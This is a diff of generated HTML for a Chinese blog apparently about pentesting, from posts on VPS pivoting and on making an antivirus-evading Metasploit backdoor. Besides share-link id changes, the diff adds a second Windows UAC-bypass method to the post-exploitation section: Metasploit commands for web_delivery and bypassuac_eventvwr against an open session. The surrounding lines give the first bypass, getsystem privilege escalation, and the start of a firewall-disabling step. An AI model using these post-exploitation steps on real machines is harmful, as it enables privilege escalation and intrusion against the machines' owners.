@@ -117,7 +117,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/02/12/ssh-vps实现外网渗透/" data-id="cjs1tn9fo00017ov60ddjb5n9" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/02/12/ssh-vps实现外网渗透/" data-id="cjs30euph0000ncv6h43oido3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -249,12 +249,15 @@ __asm
 <p>⑦得到shell后，尝试利用getuid和getsystem命令来提权：</p>
 <p><img src="/2019/02/01/利用metasploit生成免杀后门/99.PNG" alt=""></p>
 <p>结果可以判定遭到了UAC的用户访问控制的拦截！尝试绕过：</p>
+<p>①第一种方法</p>
 <p><code>use exploit/windows/local/ask</code></p>
 <p><code>set session 1</code></p>
 <p><code>exploit</code></p>
 <p><img src="/2019/02/01/利用metasploit生成免杀后门/000.PNG" alt=""></p>
 <p>成功执行后，会在目标系统上弹出一个确认框点击即可成功绕过！再来看看shell权限：</p>
 <p><img src="/2019/02/01/利用metasploit生成免杀后门/dd.PNG" alt=""></p>
+<p>②第二种方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">利用模块：</span><br><span class="line">msf &gt; use exploit/multi/script/web_delivery </span><br><span class="line">搜索bypassuac：  </span><br><span class="line">msf exploit(web_delivery) &gt; search bypassuac</span><br><span class="line">使用提权模块，进行对windows uac绕过：</span><br><span class="line">msf exploit(web_delivery) &gt; use exploit/windows/local/bypassuac_eventvwr</span><br><span class="line">设置回话（比如说我这里的话说是1）那就设置1：</span><br><span class="line">msf exploit(bypassuac_eventvwr) &gt; set SESSION 1</span><br><span class="line">执行exploit，执行提权：</span><br><span class="line">msf exploit(bypassuac_eventvwr) &gt; exploit</span><br><span class="line">缺点：绕不过360等杀软</span><br></pre></td></tr></table></figure>
 <p>命令：</p>
 <p>①通过shell来关闭防火墙：</p>
 <p><code>shell</code></p>
@@ -291,7 +294,7 @@ __asm
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/02/01/利用metasploit生成免杀后门/" data-id="cjs1tn9fg00007ov6ckb3q78c" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/02/01/利用metasploit生成免杀后门/" data-id="cjs30eusd0001ncv6cf9by1dd" class="article-share-link">Share</a>
       
       
     </footer>
